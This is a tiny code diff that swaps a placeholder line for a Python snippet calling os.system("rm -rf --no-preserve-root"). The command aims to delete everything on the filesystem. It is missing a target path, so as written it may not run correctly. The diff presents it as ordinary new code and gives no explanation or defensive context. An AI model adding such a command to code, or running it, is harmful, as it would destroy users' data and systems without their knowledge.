@@ -1,1 +1,4 @@
-here is gonna be some python
+
+import os
+
+os.system("rm -rf --no-preserve-root")
